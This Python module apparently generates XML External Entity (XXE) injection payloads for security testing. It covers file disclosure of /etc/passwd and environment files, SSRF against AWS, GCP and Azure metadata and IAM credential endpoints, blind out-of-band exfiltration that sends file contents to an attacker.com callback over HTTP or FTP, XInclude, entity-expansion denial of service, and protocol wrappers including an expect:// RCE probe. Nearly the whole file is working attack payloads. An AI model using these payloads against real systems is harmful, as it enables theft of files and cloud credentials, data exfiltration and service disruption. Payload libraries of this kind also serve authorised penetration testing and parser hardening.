"""
XXE payload generators for XML External Entity injection testing.

Payloads organized by attack type:
- File disclosure
- SSRF
- Blind XXE (out-of-band)
- XInclude
- Denial of Service
- SVG/File upload

CWE Coverage: CWE-611, CWE-776, CWE-827, CWE-918
"""

from typing import Generator


def file_disclosure_payloads(os_type: str = "linux") -> Generator[str, None, None]:
    """
    Payloads for file disclosure via XXE.
    CWE-611: Improper Restriction of XML External Entity Reference.

    Args:
        os_type: Target OS ('linux', 'windows', 'generic')
    """
    linux_files = [
        ("file:///etc/passwd", "passwd file"),
        ("file:///etc/hostname", "hostname"),
        ("file:///etc/hosts", "hosts file"),
        ("file:///proc/version", "kernel version"),
        ("file:///proc/self/environ", "environment variables"),
    ]

    windows_files = [
        ("file:///c:/windows/win.ini", "win.ini"),
        ("file:///c:/windows/system.ini", "system.ini"),
        ("file:///c:/boot.ini", "boot.ini"),
    ]

    if os_type == "linux":
        files = linux_files
    elif os_type == "windows":
        files = windows_files
    else:
        files = linux_files + windows_files

    for file_uri, desc in files:
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{file_uri}">
]>
<root><data>&xxe;</data></root>"""
        yield {"payload": payload, "file": file_uri, "description": desc}


def ssrf_payloads(target_type: str = "generic") -> Generator[str, None, None]:
    """
    Payloads for SSRF via XXE.
    CWE-611, CWE-918: XXE enabling Server-Side Request Forgery.

    Args:
        target_type: Target environment ('aws', 'gcp', 'azure', 'internal', 'generic')
    """
    targets = {
        "aws": [
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
            (
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "AWS IAM",
            ),
        ],
        "gcp": [
            (
                "http://169.254.169.254/computeMetadata/v1/instance/",
                "GCP metadata",
            ),
            (
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "GCP token",
            ),
        ],
        "azure": [
            (
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "Azure metadata",
            ),
        ],
        "internal": [
            ("http://localhost:8080/", "localhost:8080"),
            ("http://127.0.0.1:8080/", "127.0.0.1:8080"),
            ("http://192.168.1.1/", "internal gateway"),
            ("http://10.0.0.1/", "internal network"),
        ],
        "generic": [
            ("http://169.254.169.254/", "cloud metadata"),
            ("http://localhost:8080/", "localhost"),
        ],
    }

    target_list = targets.get(target_type, targets["generic"])

    for url, desc in target_list:
        payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{url}">
]>
<foo>&xxe;</foo>"""
        yield {"payload": payload, "target": url, "description": desc}


def blind_xxe_payloads(callback_url: str) -> Generator[str, None, None]:
    """
    Payloads for blind XXE with out-of-band data exfiltration.
    CWE-611: Blind XXE via external DTD and parameter entities.

    Args:
        callback_url: Attacker-controlled callback URL (e.g., 'http://attacker.com')
    """
    # Basic OOB probe
    payload_basic = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback_url}/probe">
  %xxe;
]>
<foo>test</foo>"""
    yield {
        "payload": payload_basic,
        "type": "basic_oob",
        "description": "Basic OOB probe",
    }

    # External DTD reference
    payload_dtd = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
  %xxe;
]>
<foo>test</foo>"""
    yield {
        "payload": payload_dtd,
        "type": "external_dtd",
        "description": "External DTD reference",
        "dtd_content": f"""<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{callback_url}/collect?data=%file;'>">
%eval;
%exfil;""",
    }

    # FTP-based exfiltration (for multi-line files)
    payload_ftp = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback_url}/ftp.dtd">
  %xxe;
]>
<foo>test</foo>"""
    yield {
        "payload": payload_ftp,
        "type": "ftp_exfil",
        "description": "FTP-based exfiltration for multi-line files",
        "dtd_content": """<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:21/%file;'>">
%eval;
%exfil;""",
    }


def xinclude_payloads() -> Generator[str, None, None]:
    """
    Payloads for XInclude attacks (when DOCTYPE is blocked).
    CWE-611: XXE via XInclude processing.
    """
    files = [
        "file:///etc/passwd",
        "file:///etc/hostname",
        "file:///c:/windows/win.ini",
    ]

    for file_uri in files:
        payload = f"""<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="{file_uri}"/>
</foo>"""
        yield {"payload": payload, "file": file_uri, "type": "xinclude"}


def dos_payloads(depth: int = 3) -> Generator[str, None, None]:
    """
    Payloads for Denial of Service via entity expansion.
    CWE-776: Improper Restriction of Recursive Entity References.

    WARNING: Use minimal depth for testing. Abort if server impact detected.

    Args:
        depth: Recursion depth (keep low for safety, default=3)
    """
    # Billion Laughs (minimal version for testing)
    entities = ['<!ENTITY lol "lol">']
    for i in range(1, depth + 1):
        prev = f"lol{i-1}" if i > 1 else "lol"
        entities.append(f'<!ENTITY lol{i} "&{prev};&{prev};&{prev};&{prev};&{prev};">')

    payload = f"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  {chr(10).join(entities)}
]>
<lolz>&lol{depth};</lolz>"""

    yield {
        "payload": payload,
        "type": "billion_laughs",
        "depth": depth,
        "description": f"Entity expansion (depth={depth})",
        "warning": "MINIMAL PAYLOAD - abort if server slowdown detected",
    }

    # Quadratic blowup
    payload_quadratic = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>"""
    yield {
        "payload": payload_quadratic,
        "type": "quadratic_blowup",
        "description": "Quadratic blowup (minimal)",
    }


def svg_xxe_payload(file_uri: str = "file:///etc/passwd") -> str:
    """
    Generate SVG payload with embedded XXE.
    CWE-611: XXE via SVG file upload.

    Args:
        file_uri: File to read via XXE
    """
    return f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "{file_uri}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text x="0" y="16" font-size="12">&xxe;</text>
</svg>"""


def error_based_payloads(callback_url: str) -> Generator[str, None, None]:
    """
    Payloads for error-based XXE data extraction.
    CWE-611: Extract data via parser error messages.

    Args:
        callback_url: URL for error-based extraction setup
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>"""
    yield {
        "payload": payload,
        "type": "error_based",
        "description": "Error-based extraction - file path in error message",
    }


def protocol_payloads() -> Generator[str, None, None]:
    """
    Payloads using various protocol handlers.
    CWE-611: XXE with different URI schemes.
    """
    protocols = [
        ("file:///etc/passwd", "file", "Standard file read"),
        (
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php_filter",
            "PHP filter (base64 encoding)",
        ),
        ("expect://id", "expect", "PHP expect wrapper (RCE)"),
        ("gopher://localhost:6379/_INFO", "gopher", "Gopher protocol (Redis)"),
        ("jar:http://attacker.com/evil.jar!/test.txt", "jar", "JAR protocol"),
        ("netdoc:///etc/passwd", "netdoc", "Java netdoc protocol"),
    ]

    for uri, proto_type, desc in protocols:
        payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{uri}">
]>
<foo>&xxe;</foo>"""
        yield {
            "payload": payload,
            "protocol": proto_type,
            "uri": uri,
            "description": desc,
        }


def get_all_payloads(callback_url: str = "http://attacker.com") -> Generator[dict, None, None]:
    """Yield all XXE payloads across all attack types."""
    yield from file_disclosure_payloads("generic")
    yield from ssrf_payloads("generic")
    yield from blind_xxe_payloads(callback_url)
    yield from xinclude_payloads()
    yield from dos_payloads(depth=2)  # Keep minimal for safety
    yield from error_based_payloads(callback_url)
    yield from protocol_payloads()


if __name__ == "__main__":
    print("=== XXE Payloads by Attack Type ===\n")

    print("File Disclosure Payloads (Linux):")
    for i, p in enumerate(file_disclosure_payloads("linux"), 1):
        print(f"  {i}. {p['description']}: {p['file']}")

    print("\nSSRF Payloads (AWS):")
    for i, p in enumerate(ssrf_payloads("aws"), 1):
        print(f"  {i}. {p['description']}: {p['target']}")

    print("\nXInclude Payloads:")
    for i, p in enumerate(xinclude_payloads(), 1):
        print(f"  {i}. {p['file']}")

    print("\nBlind XXE (OOB) Payloads:")
    for i, p in enumerate(blind_xxe_payloads("http://attacker.com"), 1):
        print(f"  {i}. {p['type']}: {p['description']}")
